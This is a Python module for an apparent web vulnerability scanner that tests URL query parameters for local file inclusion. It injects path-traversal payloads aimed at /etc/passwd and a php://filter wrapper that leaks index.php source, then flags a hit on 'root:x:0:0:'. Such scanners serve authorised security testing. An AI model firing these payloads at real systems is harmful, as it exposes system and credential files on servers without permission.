from utils.colors import Colors

class LFIScanner:
    def __init__(self, requester, reporter):
        self.req = requester
        self.reporter = reporter
        self.payloads = [
            "../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        self.success_indicator = "root:x:0:0:"

    def scan_url(self, url):
        if "?" not in url:
            return False
            
        base_url = url.split("?")[0]
        params = url.split("?")[1].split("&")
        
        for payload in self.payloads:
            for i in range(len(params)):
                test_params = params.copy()
                param_name = test_params[i].split("=")[0]
                test_params[i] = f"{param_name}={payload}"
                
                test_url = f"{base_url}?{'&'.join(test_params)}"
                response = self.req.get(test_url)
                
                if response and self.success_indicator in response.text:
                    print(f"{Colors.VULN} LFI (Local File Inclusion) found at: {test_url}")
                    self.reporter.add_vulnerability("LFI", test_url, f"Payload: {payload}")
                    return True
        return False